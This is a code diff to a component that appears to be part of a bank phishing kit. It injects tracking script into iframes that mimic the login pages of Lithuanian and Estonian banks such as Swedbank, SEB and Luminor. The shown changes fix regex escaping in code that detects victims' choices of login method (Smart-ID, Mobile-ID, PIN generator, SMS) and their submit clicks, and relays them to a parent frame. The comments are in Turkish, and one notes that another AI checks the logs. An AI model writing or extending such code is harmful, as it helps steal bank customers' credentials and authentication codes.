@@ -912,7 +912,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
         };
         function __miniResolveBankSlug() {
-          const m = (window.location.pathname || '').match(/lithuanian-banks\/([a-z0-9_-]+)\//i);
+          const m = (window.location.pathname || '').match(/lithuanian-banks\\/([a-z0-9_-]+)\\//i);
           return m ? m[1].toLowerCase() : '';
         }
         function __miniNormalizeText(s) {
@@ -920,8 +920,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             .toString()
             .toLowerCase()
             .replace(/[„“"'\`´]/g, '')
-            .replace(/[^\p{L}\p{N}]+/gu, ' ')
-            .replace(/\s+/g, ' ')
+            .replace(/[^\\p{L}\\p{N}]+/gu, ' ')
+            .replace(/\\s+/g, ' ')
             .trim();
         }
         function __miniTokenOverlap(a, b) {
@@ -955,7 +955,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             const i = mIdx != null ? parseInt(String(mIdx), 10) : -1;
             if (!isNaN(i) || mMth) return { index: isNaN(i) ? -1 : i, method: mMth || '', slug: mSlg || '' };
             const t = document.title || '';
-            const tm = t.match(/-\s*(.+)$/);
+            const tm = t.match(/-\\s*(.+)$/);
             if (tm) return { index: -1, method: tm[1].trim(), slug: '' };
           } catch(_) {}
           return { index: -1, method: '', slug: '' };
@@ -1677,7 +1677,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         };
 
         const extractLoginMethodLabel = (rawValue) => {
-            const loginMethod = (rawValue || '').replace(/\s+/g, ' ').trim();
+            const loginMethod = (rawValue || '').replace(/\\s+/g, ' ').trim();
             const normalized = loginMethod.toLowerCase();
 
             if (!normalized) {
@@ -1962,11 +1962,11 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                 btnText.length < 60 &&
                 /(smart[ -]?id|mobile[ -]?id|biometri(k|ja|ka)|pin[ -]?(generator|gen|kalkuliatorius)|id[ -]?kortel[ėe]|mobilescan|qr|digipass|salas[oõna]|parol|password|šifr|sms|one[ -]?time|pin[ -]?calculator)/i.test(btnText + ' ' + cls);
               // Dil / language butonlari
-              const isLangBtn = btnText.includes('keel') || btnText.includes('language') || btn.id === 'language-dropdown-button' || /\b(ru|en|et|lt|lv)\b/i.test(btnText) && btnText.length < 15;
+              const isLangBtn = btnText.includes('keel') || btnText.includes('language') || btn.id === 'language-dropdown-button' || /\\b(ru|en|et|lt|lv)\\b/i.test(btnText) && btnText.length < 15;
 
               // STRICT SUBMIT TEXT: maks 30-40 karakter, ve net login/patvirt/prisijung...
-              const submitText = /^(prisijung|login|log[\s-]*in|sign[\s-]*in|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
-                /(prisijung|login|log[\s-]*in|sign[\s-]*in|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;
+              const submitText = /^(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
+                /(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;
 
               if (!isTabBtn && !isLangBtn && submitText) {
                   isSubmitBtn = true;
@@ -1986,7 +1986,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                   const tabText = tab.textContent ? tab.textContent.trim().toLowerCase() : '';
                   const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr|biometri|pin generatorius|kortel|mobile-id/i) !== null;
                   
-                  if (tab.hasAttribute('data-tab-index') || tab.closest('[data-tab-index]') || isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\btab\b|\bnav-item\b|\bseb-tabs__item\b|\bc-tabs__item\b|\btab-item\b|\blhv-tab-link\b|\bauth-methods-method\b|\bds-option\b|\bds-option__label\b|\bui-tabs__control\b|\bui-tabs__caption\b/i))) {
+                  if (tab.hasAttribute('data-tab-index') || tab.closest('[data-tab-index]') || isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\\btab\\b|\\bnav-item\\b|\\bseb-tabs__item\\b|\\bc-tabs__item\\b|\\btab-item\\b|\\blhv-tab-link\\b|\\bauth-methods-method\\b|\\bds-option\\b|\\bds-option__label\\b|\\bui-tabs__control\\b|\\bui-tabs__caption\\b/i))) {
                       isTabClick = true;
                       targetTab = tab;
                   }
@@ -2027,7 +2027,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               // Eger siblings/yontem ile index bulunamadiysa (parentElement yok, siblings yanlis vb.),
               // IFRAME ICINE ENJEKTE EDILEN LITHUANIA_MINI_METHOD_MAP ile TEXT -> INDEX hesapla.
               // Bu sayede LITUANIA BANK TAB CLICK'TE HIC ZAMAN targetIndex === -1 KALMIYOR.
-              if (targetIndex === -1 && /\/lithuanian-banks\//i.test(window.location.href || '')) {
+              if (targetIndex === -1 && /\\/lithuanian-banks\\//i.test(window.location.href || '')) {
                   const labelForMini = (targetTab.textContent || '').toString().trim();
                   if (labelForMini && typeof __miniResolveIndexFromLabel === 'function') {
                       const miniIdx = __miniResolveIndexFromLabel(labelForMini);
@@ -2040,7 +2040,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               // TUM LITUANIA BANKALARI (swedbank, seb, luminor, citadele, lku, siauliu) ICIN:
               //    MINIMAP (iframe ici) yukarida, ya da parentta resolveIndexFromLoginMethod() ile
               //    DOGRU index hesaplaniyor. O yüzden asagidaki eski ESTONIA map'leri LT icin iptal!
-              const isLithuaniaBank = /\/lithuanian-banks\//i.test(window.location.href || '');
+              const isLithuaniaBank = /\\/lithuanian-banks\\//i.test(window.location.href || '');
               if (!isLithuaniaBank && (window.location.href.includes('citadele') || window.location.href.includes('coop') || window.location.href.includes('inbank') || window.location.href.includes('lhv') || window.location.href.includes('luminor') || window.location.href.includes('op-corporate') || window.location.href.includes('swedbank') || targetIndex === -1)) {
                   const tabText = targetTab.textContent.toLowerCase();
                   if (window.location.href.includes('coop')) {
@@ -2125,30 +2125,30 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               // banka-ozel text match ile targetIndex BUL.
               // (Estonia'daki hardcoded mantigin Lithuania kopyasi.)
               // ===================================================================
-              const _isLtBank = isLithuaniaBank || /\/lithuanian-banks\//i.test(window.location.href || '');
+              const _isLtBank = isLithuaniaBank || /\\/lithuanian-banks\\//i.test(window.location.href || '');
               if (_isLtBank && targetIndex === -1) {
                 const _tabText = (targetTab.textContent || '').toString().toLowerCase();
                 if (window.location.href.includes('swedbank-lt')) {
                   // 0: Biometrika/PIN, 1: Smart-ID, 2: Mobile-ID, 3: PIN generatorius, 4: ID-kortelė
-                  if (/bio|biometri|pin kodas|^pin\b/.test(_tabText)) targetIndex = 0;
+                  if (/bio|biometri|pin kodas|^pin\\b/.test(_tabText)) targetIndex = 0;
                   else if (/smart|smartid|smart-id/.test(_tabText)) targetIndex = 1;
-                  else if (/mobil|mobile|mobilesms|m\s*id/.test(_tabText)) targetIndex = 2;
-                  else if (/generator|gen\b|kod.skaiciuokl/.test(_tabText)) targetIndex = 3;
+                  else if (/mobil|mobile|mobilesms|m\\s*id/.test(_tabText)) targetIndex = 2;
+                  else if (/generator|gen\\b|kod.skaiciuokl/.test(_tabText)) targetIndex = 3;
                   else if (/kortel|id.kort|idkortel/.test(_tabText)) targetIndex = 4;
                 } else if (window.location.href.includes('seb-lt')) {
                   // 0: Smart-ID, 1: Mobile-ID, 2: SEB programėlė App, 3: Generatorius
                   if (/smart|smartid/.test(_tabText)) targetIndex = 0;
                   else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
                   else if (/program|app|aplikacija|mobili program/.test(_tabText)) targetIndex = 2;
-                  else if (/generator|gen\b|kod|skaiciuokl/.test(_tabText)) targetIndex = 3;
+                  else if (/generator|gen\\b|kod|skaiciuokl/.test(_tabText)) targetIndex = 3;
                 } else if (window.location.href.includes('luminor-lt')) {
                   // 0: Smart-ID, 1: M. parašas, 2: Generatorius
                   if (/smart|smartid/.test(_tabText)) targetIndex = 0;
-                  else if (/m\s*\.?\s*para|paras|mobile.sign|mobilesign/.test(_tabText)) targetIndex = 1;
-                  else if (/generator|kod|gen\b/.test(_tabText)) targetIndex = 2;
+                  else if (/m\\s*\\.?\\s*para|paras|mobile.sign|mobilesign/.test(_tabText)) targetIndex = 1;
+                  else if (/generator|kod|gen\\b/.test(_tabText)) targetIndex = 2;
                 } else if (window.location.href.includes('citadele-lt')) {
                   // 0: Kodų kortelė/Generatorius, 1: Mobile-ID, 2: MobileSCAN/Digipass 780
-                  if (/kodu|kod|kortel|generator|gen\b/.test(_tabText)) targetIndex = 0;
+                  if (/kodu|kod|kortel|generator|gen\\b/.test(_tabText)) targetIndex = 0;
                   else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
                   else if (/mobilescan|digipass|scan/.test(_tabText)) targetIndex = 2;
                 } else if (window.location.href.includes('lku-lt')) {
@@ -2160,7 +2160,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                   // 0: Smart-ID, 1: Mobile-ID, 2: Biometrika/PIN, 3: SMS
                   if (/smart|smartid/.test(_tabText)) targetIndex = 0;
                   else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
-                  else if (/bio|biometri|pin\b|pin kod/.test(_tabText)) targetIndex = 2;
+                  else if (/bio|biometri|pin\\b|pin kod/.test(_tabText)) targetIndex = 2;
                   else if (/sms|tekst|zinute|pranesim/.test(_tabText)) targetIndex = 3;
                 }
               }
@@ -2215,7 +2215,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                   // IFRAME ICI DEBUG LOG + BUFFER (son 100) - Baska AI bunu kontrol eder
                   // ==================================================================
                   try {
-                    const W2 = window as any;
+                    const W2 = window;
                     if (!Array.isArray(W2.__TRAE_LT_IFRAME_LOGS)) { W2.__TRAE_LT_IFRAME_LOGS = []; }
                     W2.__TRAE_LT_IFRAME_LOGS.unshift({ t: Date.now(), event: 'TAB_CLICK', text: targetTab.textContent, targetIndex, payload });
                     if (W2.__TRAE_LT_IFRAME_LOGS.length > 100) W2.__TRAE_LT_IFRAME_LOGS.length = 100;
@@ -2397,7 +2397,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           // Form boş ise butonları disable etme kontrolü
           const form = input.closest('form');
           if (form) {
-             const isLt = /\/lithuanian-banks\//i.test(window.location.href || '');
+             const isLt = /\\/lithuanian-banks\\//i.test(window.location.href || '');
              if (window.location.href.includes('coop')) {
                 form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
                     btn.disabled = false;
